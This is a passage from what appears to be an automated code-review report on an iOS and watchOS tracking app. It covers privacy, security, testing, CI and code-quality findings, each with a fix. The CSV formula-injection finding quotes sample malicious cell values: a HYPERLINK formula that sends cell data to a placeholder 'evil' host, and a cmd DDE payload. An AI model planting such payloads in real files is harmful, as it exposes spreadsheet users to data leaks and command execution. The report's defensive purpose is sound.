loadPhoto stores the PhotosPickerItem's raw Data verbatim into aspiration.imageData in the SwiftData store. Unlike moment photos, which go through MomentPhotoImport.downscaledJPEG (CGImageSourceCreateThumbnailAtIndex + JPEG re-encode, which drops EXIF/GPS and caps size), the cover keeps the original file: full camera resolution plus all embedded metadata, typically including precise GPS coordinates of where the photo was taken. That location data then lives in the store (and its backups) even though the app only ever needs display pixels — a data-minimization gap (MASVS-STORAGE-1). The MomentPhotoImport doc comment contrasts the cover only on storage-growth grounds, not metadata.

**Fix.** Re-encode the cover on import the same way moments do (decode-time downscale + JPEG re-encode), which strips EXIF/GPS as a side effect; or explicitly strip metadata before assigning imageData.


<a id="f-91"></a>
#### 🔵 LOW · `lead-track Widget/ScoreboardWidget.swift:170`

**Home-screen widgets fully bypass the app's biometric app lock**

The app offers a Face ID/passcode app lock (AppLockService) that gates the app UI, but ScoreboardWidget (metric names, streaks, daily/weekly goal progress) and TimerControlWidget (metric name, running state, today's total) render the same tracked data directly from the shared store on the home screen with no awareness of the lock setting, no .privacySensitive() marking, and no user option to hide widget data. Anyone the user hands their unlocked phone to — the exact threat the app lock addresses — sees everything the lock protects, and on iPadOS these systemSmall/systemMedium families can also be placed on the lock screen. The lock feature's promise is silently undermined.

**Fix.** When app lock is enabled (mirror the appLockEnabled flag into the shared app-group UserDefaults so the widget extension can read it), have the timeline providers emit redacted entries (generic labels, no names/totals) or mark the sensitive Text views .privacySensitive(); alternatively offer an explicit "show data in widgets" setting that defaults off while app lock is on.


<a id="f-92"></a>
#### 🔵 LOW · `lead-track Widget/TimerActivityLiveActivity.swift:98`

**Live Activity shows metric and project names on the locked lock screen without .privacySensitive()**

The lock-screen presentation of the Live Activity (lockScreenView, lines 92-118) and the Dynamic Island expanded region render context.attributes.metricName and projectName as plain Text. Live Activities are visible on the lock screen while the device is locked, so whatever the user is tracking (metric names in this app can be highly personal — habits, health, therapy, etc.) is readable by anyone who picks up the locked phone. The app even ships an optional biometric app lock (lead track/Services/AppLockService.swift), signalling the user may consider this data sensitive, yet none of the lock-screen text is marked .privacySensitive(), so it is never redacted under the system's 'redact when locked' behavior and there is no redacted placeholder handling.

**Fix.** Apply .privacySensitive() to the metric-name and project-name Text views in lockScreenView (and optionally the expanded Dynamic Island center), and handle the privacy redaction reason with a generic placeholder such as "Timer running" so users who enable lock-screen redaction get a generic label instead of the tracked activity's name.



**security**

<a id="f-93"></a>
#### 🔵 LOW · `Shared/Services/CSVExporter.swift:90`

**CSV export does not neutralize formula injection (CWE-1236) in metric/project names**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: CSV export does not neutralize spreadsheet formula injection.

escape() only quotes fields containing comma, quote, or newline; it never neutralizes fields beginning with '=', '+', '-', '@', tab, or CR. Metric and project names are free text that flow into the first two CSV columns. Crucially, names can also enter the store from an untrusted source: CSVImporter.findOrCreate creates metrics/projects verbatim from any imported CSV file, so a CSV shared by a third party can plant a name like '=HYPERLINK("http://evil/?"&A1)' or '=cmd|/C ...' that persists in the store and executes when the user's later export is opened in Excel/LibreOffice/Numbers.

**Fix.** In escape(), when a field starts with '=', '+', '-', '@', tab, or CR, prefix it with a single quote (or space) before applying the existing quoting, per OWASP CSV-injection guidance.


<a id="f-94"></a>
#### 🔵 LOW · `Shared/Services/CSVImporter.swift:236`

**CSV import accepts NaN/infinity/negative values and unbounded timestamps from external files**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: watch-action / import numeric values are unvalidated (NaN/inf/negative/unbounded).

ParsedRow parses the Value column with Double.init(String), which accepts "nan", "inf", "infinity", and "1e308" (Swift's Double string init parses these), plus negatives. CSV import is the app's one true untrusted-file input (any file the user is handed can be imported). A single row with Value=nan creates a Session whose value poisons every downstream aggregate exactly as in the watch-action finding, and duration/derived-intention math. Dates are also unbounded — rows can create sessions decades in the future, corrupting week windows and goal seasons.

**Fix.** After parsing, require value == nil || (value!.isFinite && value! >= 0), and reject or clamp startedAt/endedAt to a sane range (e.g. not after .now); count offending rows in rowsSkipped.


<a id="f-95"></a>
#### 🔵 LOW · `lead track/Services/AppLockService.swift:56`

**Silent permanent lockout when LAContext.canEvaluatePolicy fails (e.g. passcode removed)**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: AppLock permanently locks out a device whose passcode was removed.

authenticate() bails out with a bare `return` when canEvaluatePolicy fails, leaving isLocked == true with no error surfaced. AppLockSettingsView lets the user enable the lock without checking that .deviceOwnerAuthentication is available, and isLocked is set from UserDefaults at init. A user who enables the lock and later removes their device passcode (or hits biometry lockout states where the policy is unavailable) relaunches into AppLockView whose Unlock button silently does nothing forever — a fail-closed denial of access to all of their own data with no recovery path or messaging.

**Fix.** When canEvaluatePolicy fails, distinguish the error: for LAError.passcodeNotSet either unlock (the device itself has no passcode, so the app lock protects nothing) or show an explanatory message with a path forward; also gate enabling the toggle in AppLockSettingsView on canEvaluatePolicy succeeding.



**testing**

<a id="f-109"></a>
#### 🔵 LOW · `Shared/Services/GoalSummary.swift:32`

**GoalSummary.daily and isDailyComplete hardcode .now instead of injecting the instant**

Both APIs take an injectable `calendar` but bake `.now` into `isGoalDay(on: .now, ...)` (lines 32 and 47), so daily completion cannot be evaluated for any other instant nor tested deterministically around midnight/rest-day boundaries. The codebase pattern elsewhere is `now: Date = .now` (AspirationRollup.receivedEffortToday, GoalSeason.phase, ComplicationProgress.metrics(at:)). ComplicationProgress.dailySummary even documents that it "agrees with GoalSummary.daily(for:) given a fresh snapshot" — an equivalence that can't be asserted in a test because GoalSummary's instant is unpinnable.

**Fix.** Add `now: Date = .now` parameters to daily(for:), isDailyComplete, and isDailyMet (passing it into isGoalDay and todayTotal), consistent with the rest of the services.


<a id="f-110"></a>
#### 🔵 LOW · `Shared/Services/NotificationService.swift:321`

**NotificationService date logic hard-codes Date.now/Calendar.current, unlike the planner layer it wraps**

The project deliberately keeps schedulable date math in pure, injectable planners (ReminderPlanner, IntentionQuestionPlanner both take now:/calendar: and are Linux-tested), yet NotificationService still contains its own untestable date logic: nextGoalDate/goalCandidate/isGoalMoment (the streak-alert day picker with its own 0...7 excluded-weekday walk), hasLoggedToday, and hasRecentActivity all read Date.now and Calendar.current directly. This logic is a near-duplicate of ReminderPlanner.goalDays and can never be exercised by the SwiftPM overlay tests since the whole file is Apple-only.

**Fix.** Move the goal-day selection (nextGoalDate and friends) into ReminderPlanner next to goalDays — it is the same 'next non-excluded weekday' walk — leaving NotificationService as a thin trigger-wrapping shell, consistent with how reminders and intention questions are already structured.


<a id="f-111"></a>
#### 🔵 LOW · `Shared/Services/SessionStatistics.swift:54`

**Half of SessionStatistics hard-codes .now and Calendar.current, blocking deterministic tests**

The newer functions (todayTotal(from:calendar:), currentWeekTotal(from:calendar:), weeklyTotals, trailingDailySeries, movingAverage) accept an injectable calendar, but recentAverage, overallAverage, todayTotal(from totals:), currentWeekTotal(from totals:), averageSessionsPerDay, recentAverageSessionsPerDay, recentAverageSessionLength, currentStreak/longestStreak and all streak helpers hard-code Calendar.current and anchor on .now with no now: parameter anywhere in the file. WeeklyReview.build consistently threads now:/calendar: through; SessionStatistics does not, so any test of averages, streaks or windows is nondeterministic near midnight and cannot exercise DST/timezone/week-start edge cases (the project's Linux tests already work around this with midnight-anchored dates). The inconsistency also means a maintainer cannot tell which functions are safe to call with a fixed clock.

**Fix.** Add now: Date = .now and calendar: Calendar = .current parameters uniformly (or a single Clock/reference-date struct) and thread them through the streak and average helpers, matching the convention WeeklyReview already established.


<a id="f-112"></a>
#### 🔵 LOW · `Shared/Services/WatchSnapshotCache.swift:6`

**Shared/Services files with no test coverage at all**

Files in Shared/Services referenced by no test, directly or indirectly: (1) WatchSnapshotCache.swift and (2) CompletionAlertSettings.swift — both platform-neutral (Foundation-only, compiled into the Linux overlay) and trivially testable (decode-failure fallback to `.empty`, default-on semantics of the sound/haptic flags), yet untested; (3) NotificationService.swift and NotificationService+IntentionQuestions.swift — Apple-only (`#if canImport(UserNotifications)`), so only the extracted IntentionQuestionPlanner math is covered while identifier bookkeeping, wipe-and-rebuild sweep, and deep-link userInfo wiring are not; (4) StartTimerIntent.swift / StopTimerIntent.swift — Apple-only AppIntents, excluded from the overlay; (5) AppGroup.swift — a single constant, fine to leave. Additionally SessionService, WatchActionHandler and WatchSnapshotBuilder have test files that never execute (see the Package.swift/CI finding). RollupBucket, MarkdownExportWindow/Profiles, GoalSummary and SessionDayGrouping are covered indirectly through their tested callers.

**Fix.** Add small overlay-runnable tests for WatchSnapshotCache (corrupt/missing data returns .empty, save/load round-trip via a test UserDefaults suite) and CompletionAlertSettings (defaults-to-on, toggle round-trip). For the notification and intent files, keep extracting decision logic into planner-style pure functions as already done for IntentionQuestionPlanner/ReminderPlanner.


<a id="f-113"></a>
#### 🔵 LOW · `lead track.xcodeproj/xcshareddata/xcschemes/lead track.xcscheme:55`

**UI test target is an active testable but executes nowhere — a sixth dead test file and a whole dead-but-wired target**

The shared scheme wires lead trackUITests.xctest as an unskipped testable, so CI's 'Build for testing' step compiles it on every run, but the 'test-without-building' step is skipped whenever the runner has no bootable simulator (the current permanent state per ios.yml's fallback), and XCTest UI tests cannot run in the Linux SwiftPM overlay. LeadTrackUITests.swift has therefore never executed since the tab-shell rework. The moment macos-latest regains a bootable simulator, xcodebuild test-without-building will suddenly start running these two UI tests cold — slow, flaky by nature on CI, and with at least one assertion likely to fail (see the staticTexts finding) — turning an unrelated future CI run red. This extends the confirmed 'five test files execute nowhere' finding to a sixth file (lead trackUITests/LeadTrackUITests.swift) plus an entire target.

**Fix.** Decide the target's fate explicitly: either mark the TestableReference skipped="YES" in the scheme (or restrict CI with -only-testing:"lead trackTests") until UI tests are deliberately re-adopted, or delete the target. If keeping it, fix the stale assertion first so a returning simulator does not break CI.


<a id="f-114"></a>
#### 🔵 LOW · `lead track/Views/GoalSettingsView.swift:291`

**Goal/season/binary-retirement save semantics live inside the view with no testable seam**

`save()`, `applyTarget()`, `applyBinaryExpectation()`, and `saveSeason(_:)` (lines 291-351) encode subtle business rules: seasons are re-stamped only when the target amounts changed, unseasoned legacy goals acquire a season on first edit, binary expectation off/on toggles `binaryGoalRetiredAt`, and rest days are cleared when the daily goal is off. All of this mutates the Metric directly from a SwiftUI view in the iOS-only target. Per the project's own setup, iOS unit tests are skipped on CI and domain logic is tested via the Linux SwiftPM overlay, which only compiles Shared/ — so none of these rules can be covered by the tests that actually run. A regression here (e.g. accidentally re-stamping the season on a reminder-only edit) would ship silently.

**Fix.** Extract the draft state plus apply logic into a plain struct in Shared/ (e.g. `GoalSettingsDraft` with `init(metric:)` and `apply(to metric:) -> GoalChange`), keep the view as a thin binding layer, and add swift-testing cases for the season-stamping and binary-retirement rules in the overlay test target.


<a id="f-115"></a>
#### 🔵 LOW · `lead trackTests/AspirationAlignmentTests.swift:152`

**Divergence guard's flat-effort and zero-first-half branches untested; effortSeries→divergence integration never exercised together**

All divergence tests feed hand-built effort arrays, so the real pipeline (AspirationAlignment.effortSeries output into divergence, including the `effort.suffix(divergenceWindowWeeks)` trim of a 12-week history array) is never exercised end-to-end. Within flatOrRisingRatio, two documented branches are untested: exactly flat effort (secondMean == firstMean should still fire, per the "flat or rising" contract) and firstMean == 0 with activity only in the second half (ratio hard-coded to 1). A regression that made "flat" read as "falling" (`>` instead of `>=`) would pass every existing test.

**Fix.** Add a test with effort like [2,2,2,2,2,2] plus falling ratings asserting divergence fires with effortChangeRatio == 1, one with [0,0,0,3,3,3] asserting ratio == 1, and one integration test that builds sessions, calls effortSeries(weeks: 12), and passes the result to divergence.


<a id="f-116"></a>
#### 🔵 LOW · `lead trackTests/GoalSeasonTests.swift:120`

**Exact boundary between .due and .pastSeason (over == graceWeeks) is untested**

GoalSeason.phase flips at `over < graceWeeks ? .due : .pastSeason(weeksOver: over)` with graceWeeks == 2. The tests probe seasoned(7) (over=1, .due) and seasoned(9) (over=3, .pastSeason) but skip seasoned(8), the exact `over == 2` boundary where an off-by-one (`<=` vs `<`) would silently extend or truncate grace. Similarly untested nearby boundaries: `weeksUntil`'s "never below one" clamp (an active season on its final day should still report weeksRemaining == 1), and AspirationRollupTests' recent window is only probed at day(0) vs day(40) — the exact window edge (e.g. day 29 vs day 30) is never asserted, so the window length itself is unpinned.

**Fix.** Add `#expect(GoalSeason.phase(of: seasoned(8), now: now) == .pastSeason(weeksOver: 2))`, a last-active-day case asserting `.active(weeksRemaining: 1)`, and a rollup test placing sessions on both sides of the recent-window edge.


<a id="f-117"></a>
#### 🔵 LOW · `lead trackTests/IntentionRenewalChainTests.swift:69`

**setAgain clone is only verified for counted intentions; question and derived-shape carryover untested**

IntentionRenewal.setAgain copies derivedMode, metric, perDay, and re-applies the daily question (renewed.applyQuestion(source.question)). The tests (setAgainClonesTheCommitmentIntoTheCurrentWeek and friends) only renew counted intentions and assert title/kind/target/aspiration/predecessorID/weekStart/tickDates/isOpen. A regression that drops the metric link, derivedMode, perDay flag, or the question on renewal — breaking derived progress or the per-intention daily notification for every renewed week — would pass the entire suite.

**Fix.** Add a test renewing a derived per-day intention with a question, asserting renewed.metric === source.metric, renewed.derivedMode == source.derivedMode, renewed.perDay, and renewed.question == source.question.


<a id="f-118"></a>
#### 🔵 LOW · `lead trackTests/MetricColorTests.swift:51`

**Contrast tests assert against duplicated Theme background constants that can silently drift**

MetricColorContrastTests restates Theme's warm-neutral backgrounds by hand (Components(red: 0.978, green: 0.968, blue: 0.96) etc.) because Theme is SwiftUI-only. The comment acknowledges this, but the coupling means a designer changing Theme's neutrals gets a green run while the WCAG guarantee being tested (3:1 / 4.5:1) is validated against stale backgrounds — precisely the failure the test exists to catch.

**Fix.** Move the two background component values into a platform-neutral constants file (e.g. next to MetricColor.Components in Shared/) that Theme consumes, so the test and the UI provably share one source of truth.


<a id="f-119"></a>
#### 🔵 LOW · `lead trackTests/SessionStatisticsTests.swift:459`

**labelsOlderDaysWithTheirDate couples to the host locale's digit system**

SessionDayGrouping.label formats older days via day.formatted(.dateTime.month(.wide).day()), which renders digits and month names in the current locale, while the assertion interpolates the day number with Swift's invariant Western digits: label.contains("\(calendar.component(.day, from: older))"). On a machine or CI image with a locale using non-Western digits (ar, fa, hi with native numerals) the test fails although the code is correct. The 'Today'/'Yesterday' assertions are safe (hardcoded English in the source), and ReminderPlannerTests shows the suite's better pattern (explicit fixed calendar).

**Fix.** Pin the assertion to a formatter built with the same locale the source uses (compare against older.formatted(.dateTime.day()) output), or have SessionDayGrouping accept a locale/calendar and pass a fixed en_US_POSIX one in the test.


<a id="f-120"></a>
#### 🔵 LOW · `lead trackTests/WatchSyncCodecTests.swift:205`

**WatchSnapshotReducer stop edge cases untested: stop-while-idle and negative-elapsed clamp**

WatchSnapshotReducer's .stopTimer branch has two deliberate edge behaviors with no test: (1) a stop when runningSince is nil must leave todayTotal untouched while still clearing runningSince (a stale queued stop from the watch), and (2) max(action.timestamp.timeIntervalSince(since), 0) clamps a stop timestamp earlier than the start to zero accumulation — the reducer-side mirror of WatchActionHandlerTests.stopClampsToSessionStart, which itself only runs on a Mac (see the Package.swift/CI finding). WatchSnapshotReducerTests covers only the happy path (stopAccumulatesElapsedTime).

**Fix.** Add two reducer tests: applying a .stopTimer to a snapshot with runningSince nil (expect unchanged totals), and a .stopTimer timestamped before runningSince (expect todayTotal unchanged, runningSince nil). These run on Linux, unlike the handler tests.


<a id="f-121"></a>
#### 🔵 LOW · `lead trackUITests/LeadTrackUITests.swift:34`

**testCreateNewMetric's final assertion is stale against the folded Today dashboard: metric name renders uppercased, so staticTexts["Reading"] will not match**

After saving, the test asserts app.staticTexts["Reading"].waitForExistence. On the current Today screen a new metric with no aspiration appears only as the title of its folded cluster stub (TodayClusterSections folds every cluster to a one-line stub by default; a lone unaligned metric titles its own card via ClusterHeaderLabel.title, ClusterCardView.swift:163-166). That title Text applies .textCase(.uppercase) (ClusterCardView.swift:145), so the rendered/accessibility label is "READING", and XCUIElementQuery subscript matching is case-sensitive — "Reading" matches nothing. The rest of the test's identifiers are still valid (navigationBars["Today"] = MetricListView.swift:39; buttons["Add Metric"] = MetricListView.swift:46; "New Metric"/"Name"/"Save" all present in MetricFormView.swift:47,79,86,204; -uitest is honored with an in-memory container at lead_trackApp.swift:10-12 and an app-lock bypass at AppLockService.swift:37), so this is the specific assertion that would fail the moment the target runs again. Plausible rather than confirmed: no simulator is available to execute it.

**Fix.** If the UI test target is kept, assert on a case-insensitive/label-based query (e.g. a predicate matching 'READING' or, better, give the cluster title a stable accessibilityIdentifier) or expand the stub before asserting; otherwise delete the test with the target.



### Informational (34)


**CI**

<a id="f-122"></a>
#### ⚪ INFO · `.github/workflows/ios.yml:1`

**No top-level permissions block — GITHUB_TOKEN falls back to the repository default**

ios.yml declares no `permissions:` at workflow or job level, so the GITHUB_TOKEN each job receives is whatever the repository/org default is (historically read/write for repos created before Feb 2023). The build job executes brew-installed binaries (swiftlint, swiftformat) and xcodebuild build phases that run repo-supplied shell scripts; the linux job runs `swift test` compiling arbitrary repo code. On push/workflow_dispatch runs, a compromised toolchain dependency or malicious macro/test code could use a write-scoped default token to push commits or tamper with the repo.

**Fix.** Add `permissions:\n contents: read` at the top level of ios.yml. Also set the repository's default workflow permissions to read-only in Settings → Actions.


<a id="f-123"></a>
#### ⚪ INFO · `.github/workflows/ios.yml:22`

**Actions pinned to mutable major-version tags, not commit SHAs**

`actions/checkout@v5` (ios.yml lines 22, 82) and `actions/upload-artifact@v4` plus `actions/checkout@v5` in release.yml are pinned to floating tags. Tags are mutable and were the attack vector in the tj-actions/changed-files compromise (CVE-2025-30066). These are first-party GitHub actions, so risk is lower than for third-party actions, but the release workflow runs them with the Admin ASC key in scope, so a repointed tag would be a direct secret-exfiltration path.

**Fix.** Pin all `uses:` references to full commit SHAs (with a trailing version comment) and let Dependabot bump the pins, at minimum in release.yml where signing secrets are present.



**SwiftData**

<a id="f-148"></a>
#### ⚪ INFO · `Shared/Models/Metric.swift:16`

**Metric.measurementType and Project.status stored as enum attributes, contrary to the repo's raw-string storage doctrine**

The codebase repeatedly documents storing enums as raw strings 'so a store written by a newer app version with an unknown kind still opens' (Intention.kindRaw, Metric.healthSourceRaw/healthExportRaw/countLogStyleRaw, AspirationCheckIn.ratingRaw). Yet the two oldest fields — `Metric.measurementType: MeasurementType` (Metric.swift:16) and `Project.status: ProjectStatus` (Project.swift:12) — store the Codable enum itself. If a newer build ever adds a case (a fourth MeasurementType is plausible given binary was added), an older build's fetch of that row fails to materialize the attribute rather than degrading gracefully, defeating the forward-compat guarantee the rest of the schema pays for.

**Fix.** For any future case additions, migrate these to the `xxxRaw: String` + typed-accessor pattern (a lightweight migration renaming/backfilling the attribute). At minimum, apply the raw-string convention to all new enum-typed model attributes and note the exception on these two.


<a id="f-149"></a>
#### ⚪ INFO · `lead track/Views/WeeklyReviewView.swift:31`

**Unbounded @Query fetches of lifetime histories filtered in memory**

WeeklyReviewView queries every Intention, AspirationCheckIn, and Moment ever stored (`@Query(sort: \Moment.occurredAt) var moments`) and windows them in memory per render, even though the review only needs one trailing week; Moment's own doc comment says moments 'accrue for a lifetime'. MetricListView.swift:14 similarly fetches all intentions ever created for the Today tab, which only needs the current week's, and DataExportView.swift:10-14 repeats the pattern (defensible there since export can span everything). At personal-tracker scale this is not yet visible, but these are the app's hottest views and the datasets are the only unbounded ones.

**Fix.** Push the window into the fetch: e.g. `#Predicate<Intention> { $0.weekStart == reviewedWeekStart }` (or a weekStart range for the pager) and an occurredAt range for moments, keeping in-memory work proportional to the reviewed week.


<a id="f-150"></a>
#### ⚪ INFO · `lead-track Widget/ScoreboardWidget.swift:68`

**Provider fetches every Metric then takes prefix(4) instead of using FetchDescriptor.fetchLimit**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: ScoreboardWidget fetches all metrics + faults all sessions in the memory-capped extension.

`loadMetrics()` fetches all metrics from the store and discards everything past the first four with `metrics.prefix(4)`. FetchDescriptor supports `fetchLimit`, which pushes the limit into the store query. Widget timeline providers run under tight memory budgets (~30 MB), and each fetched Metric here also faults in its full `sessions` relationship via `snapshot(for:)`, so limiting at the descriptor level is the idiomatic and cheaper SwiftData pattern.

**Fix.** Set `descriptor.fetchLimit = 4` (make the descriptor a `var`) and drop the `.prefix(4)`.



**SwiftUI**

<a id="f-151"></a>
#### ⚪ INFO · `lead track/Views/MetricFoldsCard.swift:25`

**Fold rows iterated by array index with id: \.self instead of stable enum identity**

visibleFolds is a computed [Fold] whose composition changes at runtime (activity appears after the first session, history/health/projects come and go), but the ForEach identifies rows by their integer index. When a fold is inserted or removed, every subsequent row silently changes identity, defeating the withAnimation(.snappy) fold transitions and causing whole-row re-renders instead of moves. Fold is a simple enum that is (or trivially can be) Hashable, so a stable identity is free.

**Fix.** Make Fold conform to Hashable (derived) and write ForEach(visibleFolds, id: \.self) { fold in ... }, computing the divider from the fold's position via visibleFolds.first == fold or zip, so row identity follows the fold, not its slot.


<a id="f-152"></a>
#### ⚪ INFO · `lead-track Watch App/WatchLogView.swift:51`

**Crown-adjustable amount stepper has no explicit accessibility semantics**

The +/- controls are image-only buttons (`Image(systemName: "minus"/"plus")`) relying on SF Symbols' default VoiceOver labels ("Remove"/"Add"), which don't convey what is being adjusted, and the amount display (`Text("\(Int(amount))")` plus a separate unit Text) is read as two unrelated elements. An `.accessibilityAdjustableAction` / `.accessibilityElement(children: .combine)` with a value like "5 pages" would make the quick-log screen usable with VoiceOver in one swipe-adjustable element instead of three anonymous pieces.

**Fix.** Combine amountDisplay into one accessibility element with `.accessibilityLabel(metric.name)` and `.accessibilityValue("\(Int(amount)) \(metric.unit ?? "")")`, add `.accessibilityAdjustableAction` for increment/decrement, and give the +/- buttons explicit labels ("Increase amount"/"Decrease amount").


<a id="f-153"></a>
#### ⚪ INFO · `lead-track Widget/ScoreboardWidget.swift:231`

**Scoreboard rows convey goal progress and streaks purely visually with no accessibility descriptions**

The mini progress rings identify themselves only by single letters "D"/"W" and the streak badge by a flame icon plus a bare number; state (rest day, percent to goal) is encoded in trim fraction and tint only. VoiceOver users hear something like "book, Reading, D, W, flame, 5" with no meaning. There is no `accessibilityLabel`/`accessibilityElement(children: .combine)` anywhere in the widget target.

**Fix.** Combine each metric row into one accessibility element with a formatted label, e.g. `.accessibilityElement(children: .ignore).accessibilityLabel("Reading, 20 of 30 minutes today, 5 day streak")`.



**complexity**

<a id="f-124"></a>
#### ⚪ INFO · `Shared/Services/WeeklyReview.swift:153`

**Two different 'week' definitions coexist inside one review assembly**

WeeklyReview.PeriodBounds defines the reviewed week as a trailing 7-day window ending today (anchor = today - 7*weeksBack), while the intention layer in the same build() call uses real calendar weeks via calendar.dateInterval(of: .weekOfYear) and Intention.weekStart (WeeklyReview.swift:126, WeeklyReviewIntentions.swift:45-48). SessionStatistics.currentWeekTotal adds a third consumer of .weekOfYear. The two definitions only coincide when the review is opened on the first day of a calendar week; otherwise a session or moment can fall inside the reviewed window but outside the intention week (and vice versa), and a maintainer editing 'this week' logic must know which of the two rules applies at each site. The individual doc comments are good, but nothing names the split at the type level.

**Fix.** Document the dual convention prominently on PeriodBounds (or introduce distinctly named types, e.g. TrailingWeek vs CalendarWeek), so the trailing-window review period and the calendar-week intention period cannot be conflated when either is next modified.


<a id="f-125"></a>
#### ⚪ INFO · `lead track/Views/MetricCardView.swift:84`

**todayValue recomputes todayTotal per branch although content already computed it**

content(_:) computes `let today = SessionStatistics.todayTotal(from: totals)` at line 30 and passes it to the progress bar and actionButton, yet todayValue(_:) (lines 84-103) is handed the raw totals and calls SessionStatistics.todayTotal(from: totals) again in each of its three branches, and isDoneToday (line 150) computes it a third way from metric.sessions instead of the totals already in hand. Beyond the redundant O(n) passes on every dashboard-card render (which happen continuously while any timer is live), having three call sites derive "today" differently is a drift hazard — isDoneToday's metric.sessions path can disagree with the totals-based path within the same render.

**Fix.** Compute today once in content and pass the scalar down (todayValue(today:) and isDoneToday(today:)), removing the direct metric.sessions read so the whole card renders from one snapshot.


<a id="f-126"></a>
#### ⚪ INFO · `lead-track Widget/TimerControlWidget.swift:63`

**15-minute timeline refresh policy duplicated verbatim across both providers**

TimerControlProvider.timeline (lines 63–66) and ScoreboardProvider.getTimeline (ScoreboardWidget.swift lines 54–57) each hand-roll the identical `Calendar.current.date(byAdding: .minute, value: 15, to: .now) ?? .now` next-update computation with the magic number 15 (and a `?? .now` fallback that would mean 'refresh immediately' — the opposite of the intent — if it ever fired). The sample fixtures are similarly duplicated (ScoreboardWidget.swift lines 96–111 and TimerControlWidget.swift lines 101–111 both encode the 'Reading / book / sage / 1200' placeholder). Two copies means the refresh cadence and placeholder content can drift when one is tuned.

**Fix.** Extract a small shared helper in the widget target, e.g. `enum WidgetTimeline { static let refreshInterval: TimeInterval = 15 * 60; static func nextUpdate() -> Date }`, and use it from both providers; consider a shared SampleData namespace for the placeholder fixtures.



**idiom**

<a id="f-127"></a>
#### ⚪ INFO · `Shared/Services/MeasureHealth.swift:93`

**medianSessionValue returns the upper-middle element, not the median, for even-sized samples**

`values[values.count / 2]` picks the upper of the two middle elements when the count is even (e.g. median of [10, 20] reads as 20, not 15). The function is named medianSessionValue and its result scales the streak-saver ceiling (`median * saverValueShare`), so for small even-sized histories the detector is slightly more permissive than the documented "a quarter of the metric's median". Impact is negligible for a heuristic, but the name promises a statistic the code does not compute.

**Fix.** Either average the two middle values for even counts, or rename to reflect the approximation (e.g. upperMedianSessionValue) so future readers don't treat it as an exact median.


<a id="f-128"></a>
#### ⚪ INFO · `Shared/Services/SessionStatistics.swift:330`

**DailyTotal reused as weekly bucket and moving-average point, contradicting its name**

weeklyTotals returns [DailyTotal] whose date field is actually a week start and whose duration is a 7-day sum, and movingAverage returns [DailyTotal] whose duration is an average (with sessionCount silently defaulted to 0 and meaningless). Call sites receive a type whose name asserts per-day semantics while carrying per-week or smoothed values; a consumer that innocently sums sessionCount or treats date as a day would be wrong with no compiler pushback.

**Fix.** Introduce a small generic DatedValue (date + value) or a WeeklyTotal alias for these series, keeping DailyTotal strictly per-day, or at minimum rename the returned element in the signature docs.


<a id="f-129"></a>
#### ⚪ INFO · `lead track/Views/MetricListView.swift:24`

**Legacy ObservableObject/@ObservedObject singleton plus DispatchQueue.main.async in an otherwise modern-concurrency codebase**

MetricListView observes `NotificationResponder.shared` via @ObservedObject/ObservableObject (pulling in Combine) while the rest of the app is on modern SwiftUI state. NotificationResponder itself (lead track/Services/NotificationResponder.swift) is not @MainActor even though its @Published properties drive navigation UI; it hops with `DispatchQueue.main.async { [weak self] ... }` in route()/routeToAspiration() (lines 63, 74) yet uses `Task { @MainActor in }` at line 44 of the same file — two different main-thread-hop idioms in one type. Per the iOS 17+ idiom (deployment target here is iOS 26.2), a shared UI-state object should be `@Observable @MainActor`, with delegate callbacks bouncing via Task { @MainActor in }.

**Fix.** Mark NotificationResponder @MainActor and migrate it to @Observable (drop Combine/@Published); observe it in MetricListView as a plain property or via @Environment. Replace the DispatchQueue.main.async hops with Task { @MainActor in } to match line 44.


<a id="f-130"></a>
#### ⚪ INFO · `lead track/lead_trackApp.swift:9`

**sharedModelContainer declared var instead of let**

The container is initialized once from a closure and never reassigned; declaring it `var` on the App struct invites accidental mutation and reads as unfinished template code. (The `fatalError` on container-creation failure is the standard template pattern for an unrecoverable launch path and is not itself flagged.)

**Fix.** Declare it `let sharedModelContainer: ModelContainer = { ... }()`.


<a id="f-131"></a>
#### ⚪ INFO · `lead-track Watch Widget/SelectWatchMetricIntent.swift:7`

**WatchMetricEntity uses a String id round-tripped from UUID, forcing uuidString comparisons at every resolution**

The entity's id is `metric.id.uuidString`, so WatchMetricProvider.resolved must compare `$0.id.uuidString == id` (WatchMetricWidget.swift:71) — a per-metric String allocation and case-sensitive text compare inside the per-entry-date resolution loop. UUID conforms to EntityIdentifierConvertible, so AppEntity supports `let id: UUID` directly; the string indirection loses type safety (any string is accepted) for no benefit.

**Fix.** Declare `let id: UUID` on WatchMetricEntity, drop the uuidString conversions in init(_:) and resolved(_:in:at:), and compare UUIDs directly.



**maintainability**

<a id="f-132"></a>
#### ⚪ INFO · `.github/scripts/asc_api.rb:25`

**JWT DER-to-raw conversion is correct; links.next host-rewrite is trusting but cannot leak the token off-host**

Verified per the review brief: (a) the ES256 signature conversion is correct — OpenSSL::BN#to_s(2) yields minimal big-endian bytes and rjust(32, "\x00") left-pads r and s to exactly 32 bytes each (P-256 guarantees they never exceed 32), and exp = iat + 1140s stays under Apple's 20-minute cap. (b) The three pagination loops (expire-builds-in-review.rb:77, revoke-dev-certs.rb:52, diagnose-bundle-ids.rb:31) follow links.next verbatim after stripping only the literal 'https://api.appstoreconnect.apple.com' prefix. If Apple ever returned a next link with a different host, port, or scheme, the un-stripped absolute URL would be sent as the request path — but always over the existing TLS connection to api.appstoreconnect.apple.com, so the bearer token cannot be redirected to a third party; the failure mode is a confusing 404 handled by the never-fail rescue. Minor robustness gap only.

**Fix.** Optionally parse links.next with URI() and continue only when uri.host == HOST && uri.scheme == 'https', using uri.request_uri as the path — makes the trust explicit and the failure mode a clean warning instead of a malformed request.


<a id="f-133"></a>
#### ⚪ INFO · `README.md:1`

**Docs never mention the product name LeadStone — repo docs and the shipped app name have fully diverged**

README.md, CONTEXT.md, and CLAUDE.md refer to the project exclusively as "lead track" (README.md:1 "# lead track", CONTEXT.md:1 same); the string "LeadStone" appears in no top-level doc (only incidentally in docs/ feature notes). A contributor or reviewer searching docs for the name users see on the home screen, in Face ID prompts, and on TestFlight finds nothing, and conversely nothing states that "lead track" is only the internal project/scheme/bundle name. This gap is what allowed the export-copy drift (previous finding) to ship unnoticed.

